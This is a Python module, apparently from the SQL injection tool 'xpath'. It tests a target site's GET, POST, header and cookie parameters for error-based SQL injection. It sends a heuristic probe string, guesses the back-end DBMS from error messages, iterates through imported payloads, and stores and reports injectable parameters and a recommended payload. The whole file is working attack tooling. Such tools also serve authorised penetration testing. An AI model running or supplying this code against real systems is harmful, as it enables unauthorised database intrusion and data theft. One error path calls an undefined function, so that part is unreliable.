#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
from xpath.common.lib import (
    re,
    os,
    sys,
    urlparse,
    parse_qs,
    collections,
    compat_urlencode,
    PAYLOAD_STATEMENT,
)
from xpath.common.utils import (
    extract_params,
    prepare_payloads,
    prepare_injection_payload,
    prepare_payload_request,
    search_dbms_errors,
    clean_up_payload,
)
from xpath.common.session import session
from xpath.injector.request import request
from xpath.logger.colored_logger import logger
from xpath.common.colors import black, white, DIM, BRIGHT
from xpath.common.payloads import PREFIX, SUFFIX, REGEX_TESTS, PAYLOADS


class SQLitest:
    """
    A class which will test for SQL injection by testing payloads ..
    """

    def __init__(
        self,
        url,
        data="",
        headers="",
        use_requests=False,
        filepath=None,
        injection_type=None,
        techniques=None,
        proxy=None,
        batch=False,
    ):
        self.url = url
        self.data = data
        self.headers = headers
        self._filepath = filepath
        self._session_filepath = os.path.join(filepath, "session.sqlite")
        self._target_file = os.path.join(filepath, "target.txt")
        self._use_requests = use_requests
        self._injection_type = injection_type
        self._techniques = techniques
        self._batch = batch
        self._proxy = proxy

    def _parse_target(self):
        ParamResponse = collections.namedtuple(
            "ParamResponse", ["params", "injection_type", "is_custom_injection"]
        )
        params = []
        injection_type = self._injection_type
        is_custom_injection = False
        _temp = ParamResponse(
            params=params,
            injection_type=injection_type,
            is_custom_injection=is_custom_injection,
        )
        if (
            self.headers
            and self.url
            and "COOKIE" in injection_type.upper()
            or "HEADER" in injection_type.upper()
        ):
            params = extract_params(value=self.headers, injection_type=injection_type)
            if "*" in self.headers:
                question = logger.read_input(
                    "custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] ",
                    batch=self._batch,
                    user_input="Y",
                )
                if question and question == "q":
                    logger.error("user quit.")
                    logger.end("ending")
                    sys.exit(0)
                if question and question == "n":
                    params = params
                if question == "" or question == "y":
                    is_custom_injection = True
                    injection_type = f"(custom) {injection_type}"
        if self.data and self.url and "POST" in injection_type.upper():
            params = extract_params(value=self.data, injection_type=injection_type)
            if "*" in self.data:
                question = logger.read_input(
                    "custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] ",
                    batch=self._batch,
                    user_input="Y",
                )
                if question and question == "q":
                    logger.error("user quit.")
                    logger.end("ending")
                    sys.exit(0)
                if question and question == "n":
                    params = params
                if question == "" or question == "y":
                    is_custom_injection = True
                    injection_type = "(custom) POST"
        if self.url and not self.data and "GET" in injection_type.upper():
            params = extract_params(value=self.url, injection_type=injection_type)
            if "*" in self.url:
                question = logger.read_input(
                    "custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] ",
                    batch=self._batch,
                    user_input="Y",
                )
                if question and question == "q":
                    logger.error("user quit.")
                    logger.end("ending")
                    sys.exit(0)
                if question and question == "n":
                    params = params
                if question == "" or question == "y":
                    is_custom_injection = True
                    injection_type = "URI"
        if params:
            _temp = ParamResponse(
                params=params,
                injection_type=injection_type,
                is_custom_injection=is_custom_injection,
            )
        return _temp

    def is_injectable(
        self,
        url,
        data="",
        headers="",
        param="",
        injectable_param="",
        injection_type="",
    ):
        dbms = None
        injectable = False
        payload = ".,))').\".."
        Response = collections.namedtuple("Response", ["dbms", "injectable"])
        _temp = Response(dbms=dbms, injectable=injectable)

        def perform_request(url, data, headers, payload, param, injection_type, uec=0):
            resp = ""
            if url and not data and "GET" in injection_type or "URI" in injection_type:
                url = prepare_injection_payload(
                    url, payload, param=param, unknown_error_counter=uec
                )
            if data and url and "POST" in injection_type:
                data = prepare_injection_payload(
                    data, payload, param=param, unknown_error_counter=uec
                )
            if (
                headers
                and url
                and "HEADER" in injection_type
                or "COOKIE" in injection_type
            ):
                headers = prepare_injection_payload(
                    headers, payload, param=param, unknown_error_counter=uec
                )
            try:
                resp = request.perform(
                    url, data=data, headers=headers, proxy=self._proxy
                )
            except Exception as error:
                logger.error(error)
                raise error
            return resp

        try:
            resp = perform_request(
                url=url,
                data=data,
                headers=headers,
                payload=payload,
                param=injectable_param,
                injection_type=injection_type.upper(),
            )
        except Exception as e:
            if "URL can't contain control characters" in str(e):
                try:
                    resp = fallback_request(
                        url=url,
                        data=data,
                        headers=headers,
                        payload=payload,
                        param=injectable_param,
                        injection_type=injection_type.upper(),
                        uec=5,
                    )
                except Exception as error:
                    raise error
            else:
                raise e
        if resp and resp.text or resp.error_msg:
            out = search_dbms_errors(resp.text)
            injectable = out.get("vulnerable")
            param = f"{DIM}{white}'{param}'{BRIGHT}{black}"
            if injectable:
                _dbms = out.get("dbms")
                dbms = f"{DIM}{white}'{_dbms}'{BRIGHT}{black}"
                logger.notice(
                    f"heuristic (basic) test shows that {injection_type} parameter {param} might be injectable (possible DBMS: {dbms})"
                )
                _temp = Response(dbms=_dbms, injectable=injectable)
                if _dbms.lower() not in ["mysql", "postgresql", "microsoft sql server"]:
                    logger.info(
                        f"Xpath currently does not support injection for '{_dbms}', will soon add support.."
                    )
                    logger.end("ending")
                    sys.exit(0)
            if not injectable:
                logger.notice(
                    f"heuristic (basic) test shows that {injection_type} parameter {param} might not be injectable"
                )
                _temp = Response(dbms="", injectable=injectable)
        return _temp

    def perform(self):
        vulns = []
        Response = collections.namedtuple(
            "Response",
            [
                "is_vulnerable",
                "dbms",
                "payloads",
                "filepath",
                "cookies",
                "headers",
                "injection_type",
                "injected_param",
                "session_filepath",
                "recommended_payload",
                "recommended_payload_type",
            ],
        )
        attemps_counter = 0
        session_data = []
        tested_payloads = []
        successful_payloads = []
        is_resumed = False
        filepath = None
        target_info = self._parse_target()
        set_cookie = ""
        set_headers = ""
        try:
            logger.notice("testing connection to the target URL.")
            resp = request.perform(
                self.url,
                data=self.data,
                headers=self.headers,
                use_requests=False,
                connection_test=True,
                proxy=self._proxy,
            )
            if "Set-Cookie" in list(resp.headers.keys()):
                set_cookie = (
                    ", ".join(resp.headers.get_all("Set-Cookie"))
                    if hasattr(resp.headers, "get_all")
                    else resp.headers.get("Set-Cookie")
                )
                set_cookie = re.sub(r"(?is)path=/", "", set_cookie)
                _show_slice = set_cookie.rstrip()
                if len(set_cookie) > 20:
                    _show_slice = f"{set_cookie[0:14]}....{set_cookie[-10:-2]}"
                question = logger.read_input(
                    f"you have not declared cookie(s), while server wants to set its own ('{_show_slice}'). Do you want to use those [Y/n] ",
                    batch=self._batch,
                    user_input="Y",
                )
                if question in ["", "y"]:
                    if "," in set_cookie:
                        set_cookie = "".join(
                            [
                                i.strip().replace("path=/", "").strip()
                                for i in set_cookie.split(",")
                            ]
                        )
                        set_cookie = ";".join(set_cookie.split(";"))
                    set_cookie = f"Cookie: {set_cookie}"
                    if (
                        not self.headers
                        or self.headers
                        and "cookie" not in self.headers.lower()
                    ):
                        self.headers += set_cookie
        except Exception as error:
            logger.critical(
                "Xpath was not able to establish connection. try checking with -v set to 5."
            )
            logger.error(error)
            sys.exit(0)
        payloads_list = prepare_payloads(
            prefixes=PREFIX,
            suffixes=SUFFIX,
            payloads=PAYLOADS,
            techniques=self._techniques,
        )
        try:
            table_name = "tbl_payload"
            session_data = session.fetch_from_table(
                session_filepath=self._session_filepath,
                table_name=table_name,
                cursor=False,
            )
            if session_data:
                is_resumed = True
            is_questioned = False
            for pay in session_data:
                vulns.append(
                    {
                        "injection_type": f"({pay.get('parameter')})",
                        "attempts": pay.get("payload_attemps"),
                        "payload": pay.get("payload"),
                        "title": pay.get("payload_type"),
                        "order": pay.get("payload_order"),
                        "regex": pay.get("regex"),
                        "injected_param": pay.get("param").replace("*", ""),
                        "dbms": pay.get("dbms"),
                    }
                )
        except Exception as error:
            pass
        if not target_info.params:
            logger.critical(
                "no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')."
            )
            logger.end("ending")
            sys.exit(0)
        if not vulns:
            dbms = ""
            vulnerable_param = ""
            successful_payload_prefix = ""
            is_injected = False
            test_dbs_specific = False
            unknown_error_counter = 0
            end_detection_phase = False
            params = target_info.params
            injection_type = target_info.injection_type
            is_custom_injection = target_info.is_custom_injection
            for entry in params:
                param = entry.get("key")
                param_value = entry.get("value")
                if is_custom_injection and param_value and "*" not in param_value:
                    logger.debug(f"Skipped parameter {param}.")
                    continue
                sep = ": " if "header" in injection_type.lower() else "="
                injectable_param = (
                    f"{param}{sep}{param_value}" if param_value else f"{param}{sep}"
                )
                resp = self.is_injectable(
                    self.url,
                    self.data,
                    self.headers,
                    param=param,
                    injectable_param=injectable_param,
                    injection_type=injection_type,
                )
                if not dbms:
                    dbms = resp.dbms
                    message = f"it looks like the back-end DBMS is '{dbms}'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"
                    question = logger.read_input(message, user_input="Y")
                    if question in ["", "y"]:
                        test_dbs_specific = True
                is_injectable = resp.injectable
                logger.info(
                    f"testing for SQL injection on {injection_type} parameter '{param if not is_custom_injection else '#1*'}'"
                )
                next_param_test = False
                for entry in payloads_list:
                    backend = entry.get("back_end")
                    title = entry.get("title")
                    if test_dbs_specific and dbms and dbms.lower() != backend.lower():
                        logger.debug(f"Skipped '{title}'")
                        continue
                    regex = entry.get("regex")
                    order = entry.get("order")
                    payloads = entry.get("payloads")
                    logger.info(f"testing '{title}'")
                    index = 0
                    if successful_payload_prefix:
                        payloads = [
                            pl
                            for pl in payloads
                            if pl.prefix == successful_payload_prefix
                        ]
                    while index < len(payloads):
                        url = self.url
                        data = self.data
                        headers = self.headers
                        obj = payloads[index]
                        payload = obj.string
                        prefix = obj.prefix
                        suffix = obj.suffix
                        logger.payload(payload)
                        it = self._injection_type.upper()
                        if "HEADER" in it or "COOKIE" in it:
                            headers = prepare_injection_payload(
                                text=self.headers,
                                payload=payload,
                                param=injectable_param,
                                unknown_error_counter=unknown_error_counter,
                            )
                        if "GET" in it:
                            url = prepare_injection_payload(
                                text=self.url,
                                payload=payload,
                                param=injectable_param,
                                unknown_error_counter=unknown_error_counter,
                            )
                        if "POST" in it:
                            data = prepare_injection_payload(
                                text=self.data,
                                payload=payload,
                                param=injectable_param,
                                unknown_error_counter=unknown_error_counter,
                            )
                        try:
                            if not is_injected:
                                attemps_counter += 1
                            response = request.inject_payload(
                                url=url,
                                regex=REGEX_TESTS,
                                data=data,
                                headers=headers,
                                use_requests=self._use_requests,
                                proxy=self._proxy,
                            )
                        except KeyboardInterrupt as e:
                            question = logger.read_input(
                                "how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(q)uit] ",
                                user_input="S",
                            )
                            if question and question == "e":
                                end_detection_phase = True
                                break
                            if question and question == "s":
                                break
                            if question and question == "n":
                                next_param_test = True
                                break
                            if question and question.lower() == "q":
                                logger.error("user quit")
                                logger.end("ending")
                                sys.exit(0)
                        except Exception as e:
                            unknown_error_counter += 1
                        else:
                            if response.ok:
                                is_injected = True
                                successful_payload_prefix = prefix
                                _ = session.generate(
                                    session_filepath=self._session_filepath
                                )
                                with open(self._target_file, "w") as fd:
                                    fd.write(
                                        f"{self.url} ({'GET' if 'cookie' in injection_type.lower() else injection_type}) # {' '.join(sys.argv)}"
                                    )
                                if param:
                                    message = f"{injection_type} parameter '{DIM}{white}{param}{BRIGHT}{black}' is '{DIM}{white}{title}{BRIGHT}{black}' injectable"
                                else:
                                    message = f"{injection_type} parameter is '{DIM}{white}{title}{BRIGHT}{black}' injectable"
                                logger.notice(message)
                                vulns.append(
                                    {
                                        "injection_type": f"({injection_type})",
                                        "attempts": attemps_counter,
                                        "payload": payload,
                                        "title": title,
                                        "order": order,
                                        "regex": regex,
                                        "injected_param": injectable_param.replace(
                                            "*", ""
                                        ),
                                        "dbms": dbms,
                                    }
                                )
                                _ = session.dump(
                                    session_filepath=self._session_filepath,
                                    query=PAYLOAD_STATEMENT,
                                    values=(
                                        str(title),
                                        order,
                                        attemps_counter,
                                        payload,
                                        injection_type,
                                        regex,
                                        "test",
                                        injectable_param,
                                        dbms,
                                    ),
                                )
                                vulnerable_param = param
                                break
                            index += 1
                    if end_detection_phase or next_param_test:
                        break
                if not is_injected:
                    _param = f"{DIM}{white}'{param}'{BRIGHT}{black}"
                    logger.notice(
                        f"{injection_type} parameter {_param} does not seem to be injectable"
                    )
                if end_detection_phase:
                    if not is_injected:
                        logger.critical(
                            "all tested parameters do not appear to be injectable"
                        )
                    break
                if is_injected and not next_param_test:
                    if vulnerable_param:
                        message = f"{injection_type} parameter '{vulnerable_param}' is vulnerable. Do you want to keep testing the others (if any)? [y/N] "
                    else:
                        message = f"{injection_type} parameter is vulnerable. Do you want to keep testing the others (if any)? [y/N] "
                    question = logger.read_input(
                        message, batch=self._batch, user_input="N"
                    )
                    if question and question == "n":
                        break
        else:
            logger.debug("skipping tests as we already have injected the target..")

        if vulns and isinstance(vulns, list):
            vulns = sorted(
                vulns,
                key=lambda k: k.get("order")
                if k.get("order")
                else k.get("payload_order"),
                reverse=True,
            )
            dbms = vulns[0].get("dbms")
            injection_type = vulns[0].get("injection_type")
            injected_param = vulns[0].get("injected_param")
            recommended_payload = vulns[0].get("payload")
            recommended_payload = clean_up_payload(
                payload=recommended_payload, replaceable_string="0x72306f746833783439"
            )
            recommended_payload_type = vulns[0].get("regex")
            param = injected_param
            if not param and self.headers:
                params = extract_params(self.headers, injection_type=injection_type)
                payload = prepare_injection_payload(
                    self.headers, recommended_payload, param=""
                ).replace("%20", " ")
                param = ""
                for p in params:
                    sep = ": " if "header" in injection_type.lower() else "="
                    _param = f"{p.get('key')}{sep}{p.get('value').replace('*', '')}"
                    _ = f"{_param}{recommended_payload}"
                    if _ in payload.strip():
                        param = _param
                        break
            if not is_resumed:
                message = f"xpath identified the following injection point(s) with a total of {attemps_counter} HTTP(s) requests:"
            if is_resumed:
                message = "xpath resumed the following injection point(s) from stored session:"
            logger.success(message)
            if param:
                sep = ":" if "header" in injection_type.lower() else "="
                _param = param.split(sep)[0] if sep in param else param
                injection_type = f"{_param} {injection_type}"
            logger.success(f"---\nParameter: {injection_type}")
            text = "    Type: error-based\n    Title: {title}\n    Payload: {_payload}"
            ok = []
            for v in vulns:
                title = v.get("title").strip()
                pl = v.get("payload").strip()
                if pl[0].lower() in ["a", "o"]:
                    pl = f" {pl}"
                if param and "HEADER" not in injection_type.upper():
                    pl = f"{param}{pl}"
                ok.append(text.format(title=title, _payload=pl))
            logger.success("\n\n".join(ok))
            logger.success("---")
            resp = Response(
                is_vulnerable=True,
                payloads=vulns,
                dbms=dbms,
                filepath=self._filepath,
                cookies=set_cookie,
                headers=set_headers,
                injected_param=injected_param,
                injection_type=self._injection_type,
                session_filepath=self._session_filepath,
                recommended_payload=recommended_payload,
                recommended_payload_type=recommended_payload_type,
            )
        else:
            resp = Response(
                is_vulnerable=False,
                dbms=dbms,
                payloads=vulns,
                filepath=None,
                cookies=set_cookie,
                headers=set_headers,
                injected_param=None,
                session_filepath=None,
                injection_type=None,
                recommended_payload=None,
                recommended_payload_type=None,
            )
        return resp
